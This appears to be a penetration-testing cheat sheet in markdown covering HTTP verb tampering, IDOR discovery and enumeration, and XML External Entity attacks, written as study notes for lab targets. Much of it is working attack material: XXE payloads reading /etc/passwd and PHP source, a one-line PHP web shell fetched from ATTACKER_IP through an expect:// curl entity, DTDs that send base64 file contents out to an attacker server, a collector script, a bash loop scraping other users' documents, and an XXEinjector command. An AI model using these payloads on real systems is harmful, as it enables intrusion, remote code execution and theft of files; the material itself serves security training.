# <a id="top-of-page"></a> Web Attacks

### Links

- [HTTP Verb Tampering](#http-verb)
  - Insecure Configs
  - Insecure Coding
- [Insecure Direct Object References (IDOR)](#idor)
  - [Identifying IDORs](#idor-id)
    - URL Params & APIs
    - AJAX Calls
    - Hashed/Encoded Values
    - Compare User Roles
  - [IDOR enumeration](#idor-enum)
- [XML External Entity (XXE)](#xxe)
  - [General XML Information](#xxe-gen)
    - XML Elements
    - XML DTD
    - XML Entities
  - [Local File Disclosure](#xxe-LFI)
    - Testing for XXE Vul
    - Reading Sensitive Files
    - Reading Source Code (simple PHP)
    - Remote Code Execution
    - SSRF
  - [Advanced File Disclosure](#xxe-advanced)
    - Advanced Exfiltration with CDATA
    - Error Based XXE
  - [Blind Data Exfiltration](#xxe-blind)
    - Manual Out-of-band Data Exfil
    - Automated OOB Exfil

# <a id="http-verb"></a> HTTP Verb Tampering

HTTP has 9 different verbs that can be accepted as HTTP methods by web servers. Other than GET and POST, the following are some of the commonly used HTTP verbs:

| **Verb** | **Description**                                                                                   |
| -------- | ------------------------------------------------------------------------------------------------- |
| HEAD     | Identical to a GET request, but its response only contains the headers, without the response body |
| PUT      | Writes the request payload to the specified location                                              |
| DELETE   | Deletes the resource at the specified location                                                    |
|          |
| OPTIONS  | Shows different options accepted by a web server, like accepted HTTP verbs                        |
|          |
| PATCH    | Apply partial modifications to the resource at the specified location                             |
|          |

## -Insecure Configs-

Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. For example, a system admin may use the following configuration to require authentication on a particular web page:

```
<Limit GET POST>
    Require valid-user
</Limit>
```

Even though the configuration specifies both GET and POST requests for the authentication method, an attacker may still use a different HTTP method (like HEAD) to bypass this authentication mechanism altogether.

</br>

## -Insecure Coding-

Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities (though some may not consider this Verb Tampering). This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:

```
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

The sanitization filter is only being tested on the GET parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the $\_REQUEST["code"] parameters are being used, which may also contain POST parameters, leading to an inconsistency in the use of HTTP Verbs. In this case, an attacker may use a POST request to perform SQL injection, in which case the GET parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection.

[Back to top](#top-of-page)

</br>

# <a id="idor"></a> IDOR

IDOR vulnerabilities are amond the most common web vulnerabilities. IDOR occurs when a web app exposes a direct reference to an object (e.g., file, database), which the end-user can directly control. A weak access control system is what causes IDOR vulnerabilities to appear, and all user controlled object fields should be tested.

## <a id="idor-id"></a> -Identifying IDORs-

### --URL Params & APIs--

Study all HTTP requests to look for URL params or APIs with an object reference . These are mostly found in URL params and APIs, but may also be found in other HTTP headers like cookies. The values identified should be fuzzed to bee whether other successful hits around found.

_URL Params_

```
?uid=1 or ?filename=file_1.pdf
```

_APIs_

```
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

### --AJAX Calls--

Unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls, may be used to identify IDOR vulnerabilities. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.

An example, if the attacker did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, the attacker may still be able to find the admin functions if they look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references.

```
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}

```

### --Hashed/Encoded Values--

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. For example, if a reference looks like (?filename=ZmlsZV8xMjMucGRm), it is easy to guess that the file name is base64 encoded (from its character set), which can be decoded to get the original object reference of (file_123.pdf) and then re-encoded with the new value.

On the other hand, the object reference may be hashed, like (download.php?filename=c81e728d9d4c2f636f067f89cc14862c). This can appear secure at first glance, but if the client-side code is reviewed it may reveal details of how the hashed value is being created.

```
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

### --Compare User Roles--

A more advanced technique requires the evaluation of multiple users, and how the requests sent and handled for these users differ.

For example, assume the attacker had access to two different users, one of which can view their salary after making the following API call:

```
{
  "attributes" :
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as User1. However, with these details at hand, the attacker can try repeating the same API call while logged in as User2 to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called.

</br>

## <a id="idor-enum"></a> -IDOR Enumeration-

Once an potential/actual IDOR vulnerability has been found automated enumeration should be performed to locate all assets.

Tools like Burp Intruder or ZAP Fuzzer can be used, or alternatively code/scripts can be written. Example BASH script below.

```
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

[Back to top](#top-of-page)

</br>

# <a id="xxe"></a> XXE

XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow an attacker to use XML features to perform malicious actions.

## <a id="xxe-gen"></a> -General XML Information-

### --XML Elements--

```
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body>
</email>
```

| **Key**     | **Definition**                                                                                                | **Example**                              |
| ----------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| Tag         | The keys of an XML document, usually wrapped with (</>) characters.                                           | `<date>`                                 |
| Entity      | XML variables, usually wrapped with (&/;) characters.                                                         | `&lt;`                                   |
| Element     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| Attribute   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.     | `version="1.0"/encoding="UTF-8"`         |
| Declaration | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |

Furthermore, some characters are used as part of an XML document structure, like <, >, &, or ". So, if these need to be used in an XML document, they should replace them with their corresponding entity references (e.g. &lt;, &gt;, &amp;, &quot;). Finally, comments can be written in XML documents between <!-- and -->, similar to HTML documents.

### --XML DTD--

XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.

```
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It is also possible to reference a DTD through a URL, as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### --XML Entities--

Custom entities (i.e. XML variables) can be defined in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once defined, an entity can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company;). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, it can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path, as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

Note: The PUBLIC keyword can be used instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en").

</br>

## <a id="xxe-lfi"></a> -Local File Disclosure-

The first step in disclosing file content is determining which XML element is displayed back to the attacker when submitted. Example below:

### --Testing for XXE Vul--

_POST Body (XML Data) Request_

```
<?xml version="1.0" encoding="UTF-8"?>
    <root>
        <name>
        Bob
        </name>
        <tel>
        Bob
        </tel>
        <email>
        test@test.com
        </email>
        <message>
        Test
        </message>
    </root>
```

_Response Data_

```
Check your email test@test.com for instructions.
```

The next step is testing that an entity can be substituted into the reflected element. Example below:

_POST Body (XML Data) Request_

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company "TEST">
]>
    <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
</root>
```

_Response Data_

```
Check your email TEST for instructions.
```

### --Reading Sensitive Files--

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd>
]>
    <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
</root>
```

### --Reading Source Code (simple PHP)--

This only works with PHP applications, a more advanced method is available for all other frameworks.

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
    <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
</root>
```

### --Remote Code Execution--

The most efficient method to turn XXE into RCE is by fetching a web shell from an attacker server and writing it to the web app, and then interacting with it to execute commands. To do so, start by writing a basic PHP web shell and starting a python web server, as follows:

```
Anon4Now@ATTACKER[/home]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Anon4Now@ATTACKER[/home]$ sudo python3 -m http.server 80
```

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'">
]>
    <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
    </root>
```

### --SSRF--

## LINK TO SSRF CHEETSHEET

</br>

## <a id="xxe-advanced"></a> -Advanced File Disclosure-

### --Advanced Exfiltration with CDATA--

To output data that does not conform to the XML format, the content of the external file can be wrapped by a reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a begin internal entity with <![CDATA[, an end internal entity with ]]>, and then place the external entity file in between, and it should be considered as a CDATA element, as follows:

```
Anon4Now@ATTACKER[/home]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Anon4Now@ATTACKER[/home]$ python3 -m http.server 8000
```

```
<?xml version="1.0"?>
    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd"> <!-- reference the external DTD -->
    %xxe;
    ]>
    <root>
        <name>
        test
        </name>
        <tel>
        </tel>
        <email>
        &joined;
        </email>
    </root>
```

### --Error Based XXE--

Another situation that can be found is where the web application might not write any output, so the attacker cannot control any of the XML input entities to write its content. If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then the attacker can use this flaw to read the output of the XXE exploit.

_Add element "roo" instead of "root"_

```
<?xml version="1.0"?>
    <roo>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
    </root>
```

If that causes an error message to appear, it may be able to be used to exfil data.

_Create a DTD file on attacker machine._

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

_Host the file_

```
Anon4Now@ATTACKER[/home]$ python3 -m http.server 8000
```

_POST the payload_

```
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

</br>

## <a id="xxe-blind"></a> -Blind Data Exfiltration-

### --Manual Out-of-band Data Exfil--

The attack pattern here will look similar to the error-based attack. The major difference is that the victim machine will need to reach out to an attacker server with the contents of the file attempting to be read.

First use a parameter entity for the content of the file being read while utilizing PHP filter to base64 encode it. Then, create another external parameter entity and reference it to the attacker IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

If, for example, the file wanting to be read had the content of XXE_SAMPLE_DATA, then the file parameter would hold its base64 encoded data (WFhFX1NBTVBMRV9EQVRB). When the XML tries to reference the external oob parameter from the attacker machine, it will request http://ATTACKER_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB. Decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. A simple PHP script can be written that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

_Create 'index.php' file_

```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

_Start PHP server_

```
Anon4Now@ATTACKER[/home]$ vi index.php # here we write the above PHP code
Anon4Now@ATTACKER[/home]$ php -S 0.0.0.0:8000
```

_Send the Payload_

```
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
    %remote;
    %oob;
    ]>
    <root>
    &content;
    </root>
```

### --Automated OOB Exfil--

A tool called [XXEinjector](https://github.com/enjoiz/XXEinjector) can be used to perform the OOB data exfil when possible. All that is needed to run this tool is a HTTP request (can be obtained from BURP) written to a file. Only the first line of the XML payload should be used (i.e., <?xml version="1.0" encoding="UTF-8"?>) and the keyword 'XXEINJECT' should be placed after the first element.

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```
Anon4Now@ATTACKER[/home]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

All exfiltrated files get stored in the Logs folder under the tool.

[Back to top](#top-of-page)

</br>
